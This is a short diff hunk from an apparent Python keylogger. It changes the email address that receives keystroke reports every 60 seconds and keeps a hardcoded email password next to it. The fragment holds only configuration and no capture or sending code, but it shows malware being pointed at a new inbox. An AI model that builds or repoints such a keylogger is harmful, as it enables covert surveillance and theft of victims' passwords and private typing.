@@ -7,7 +7,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "abhinayjangde@gmail.com"
+EMAIL_ADDRESS = "tejald997@gmail.com"
 EMAIL_PASSWORD = "1234"
 
 class Keylogger:
